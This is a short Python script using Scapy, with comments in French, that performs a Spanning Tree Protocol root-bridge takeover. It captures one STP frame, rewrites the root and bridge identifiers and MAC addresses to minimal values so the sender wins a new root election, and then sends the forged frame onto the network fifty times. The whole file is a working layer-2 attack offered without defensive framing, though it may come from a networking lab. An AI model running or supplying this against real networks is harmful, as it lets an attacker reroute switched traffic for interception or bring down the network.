#!/usr/bin/python3
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
#Utilise la fonction (sniff) pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
frame = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
#Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
frame[0].src="00:00:00:00:00:01"
#Modification de l'identifiant du switch racine (rootid) à 0 afin de mettre en place une nouvelle élection
frame[0].rootid=0
#Modification de l'adresse MAC du switch racine (rootmac) à "00:00:00:00:00:01"
frame[0].rootmac="00:00:00:00:00:01"
#Modification de l'identifiant du pont (bridgeid) à 0
frame[0].bridgeid=0
#Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
frame[0].bridgemac="00:00:00:00:00:01"
#Affiche la
frame[0].show()
#Loop to send multiple frames into the network:
for i in range (0, 50):
    #Send changed frame back into the network:
    sendp(frame[0], loop=0, verbose=1)
    #Sleep / wait for one second:
    time.sleep(1)
